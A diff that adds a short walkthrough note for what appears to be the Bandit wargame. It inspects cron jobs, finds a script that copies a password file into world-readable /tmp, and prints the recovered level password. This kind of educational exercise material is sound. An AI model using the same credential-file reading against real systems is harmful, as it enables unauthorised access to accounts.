@@ -1,0 +1,37 @@
+cd /etc/cron.d
+ls
+-> cronjob_bandit15_root  cronjob_bandit23       e2scrub_all
+   cronjob_bandit17_root  cronjob_bandit24       otw-tmp-dir
+   cronjob_bandit22       cronjob_bandit25_root  sysstat
+ls -la
+-> total 56
+drwxr-xr-x   2 root root  4096 Apr 23 18:05 .
+drwxr-xr-x 108 root root 12288 Apr 23 18:05 ..
+-rw-r--r--   1 root root    62 Apr 23 18:04 cronjob_bandit15_root
+-rw-r--r--   1 root root    62 Apr 23 18:04 cronjob_bandit17_root
+-rw-r--r--   1 root root   120 Apr 23 18:04 cronjob_bandit22
+-rw-r--r--   1 root root   122 Apr 23 18:04 cronjob_bandit23
+-rw-r--r--   1 root root   120 Apr 23 18:04 cronjob_bandit24
+-rw-r--r--   1 root root    62 Apr 23 18:04 cronjob_bandit25_root
+-rw-r--r--   1 root root   201 Jan  8  2022 e2scrub_all
+-rwx------   1 root root    52 Apr 23 18:05 otw-tmp-dir
+-rw-r--r--   1 root root   102 Mar 23  2022 .placeholder
+-rw-r--r--   1 root root   396 Feb  2  2021 sysstat
+cat cronjob_bandit22
+-> @reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+   * * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+cat /usr/bin/cronjob_bandit22.sh
+-> #!/bin/bash
+   chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+   cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+ls /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+-> /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+file 
+-> Usage: file [-bcCdEhikLlNnprsSvzZ0] [--apple] [--extension] [--mime-encoding]
+            [--mime-type] [-e <testname>] [-F <separator>]  [-f <namefile>]
+            [-m <magicfiles>] [-P <parameter=value>] [--exclude-quiet]
+            <file> ...
+       file -C [-m <magicfiles>]
+       file [--help]
+cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+-> WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff
